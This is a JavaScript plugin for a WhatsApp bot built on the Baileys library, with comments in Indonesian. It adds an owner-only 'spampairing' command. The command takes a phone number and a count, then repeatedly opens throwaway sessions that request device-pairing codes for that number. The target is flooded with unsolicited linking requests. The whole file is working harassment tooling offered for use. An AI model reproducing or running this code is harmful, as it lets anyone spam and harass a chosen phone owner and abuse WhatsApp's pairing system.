/*
『NOTICE』 Hak cipta dilindungi.
* Script ini dibuat oleh Obscura
* Gunakan dengan bijak.
* Telegram: https://t.me/DelioGalileio
*/

import baileys from "@adiwajshing/baileys";
import fs from "fs";
import { tmpdir } from "os";
import { makeWASocket } from "../lib/simple.js"
import Pino from "pino";
import NodeCache from "node-cache";
import path from "path";

let {
  useMultiFileAuthState,
  DisconnectReason,
  makeCacheableSignalKeyStore,
} = baileys;

if (global.conns instanceof Array) console.log();
else global.conns = [];

let handler = async (m, { args }) => {
  let conns = global.conn;
  let jumlah = parseInt(args[1]) || 1; // Jumlah spam pairing
  let nomor = args[0] ? args[0].replace(/\D/g, "") : m.sender.split("@")[0]; // Nomor telepon yang akan dipairing
  await m.reply(`*[ spam ]*\nBerhasil spam ${nomor} dengan jumlah ${jumlah}`)
  for (let i = 0; i < jumlah; i++) {
    let sessionName = generateRandomName(); // Nama random untuk sesi
    let authFile = path.join(tmpdir(), sessionName);

    let { state, saveCreds } = await useMultiFileAuthState(authFile);
    let msgRetryCounterCache = new NodeCache();

    const config = {
      logger: Pino({ level: "fatal" }).child({ level: "fatal" }),
      printQRInTerminal: false,
      mobile: false,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(
          state.keys,
          Pino({ level: "fatal" }).child({ level: "fatal" })
        ),
      },
      browser: ["Linux", "Chrome", ""],
      markOnlineOnConnect: true,
      generateHighQualityLinkPreview: true,
      msgRetryCounterCache,
      defaultQueryTimeoutMs: undefined,
    };
    let conn = makeWASocket(config);
    let ev = conn.ev;

    ev.on("creds.update", saveCreds);

    // Mengirim pairing code
    if (!conn.authState.creds.registered) {
      setTimeout(async () => {
        try {
          let code = await conn.requestPairingCode(nomor);
          let hasilcode = code?.match(/.{1,4}/g)?.join("-") || code;
          await conn.sendMessage(m.chat, {
            text: `*± C A R A  P A K A I*\n\nMasukkan kode di bawah ini untuk menjadi bot clone\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan kode di atas\n\n*⏱️ Kode ini berlaku selama 60 detik*`,
          });
          await conn.sendMessage(m.chat, { text: hasilcode });
        } catch (err) {
          console.error(`Error pairing with session ${sessionName}:`, err);
        } finally {
          // Hapus file session setelah pairing
          fs.rmSync(authFile, { recursive: true, force: true });
          console.log(`Session ${sessionName} deleted after pairing.`);
        }
      }, 3000);
    }
    await conn.delay(3000)
  }
  //await m.reply('selesai spam target')
};

// Fungsi untuk menghasilkan nama acak
function generateRandomName() {
  return Math.random().toString(36).substring(2, 15) +
    Math.random().toString(36).substring(2, 15);
}

handler.help = ["spampairing <nomor> <jumlah>"];
handler.tags = ["owner"];
handler.command = /^s(pampairing|pairing)/i;
handler.owner = true

export default handler;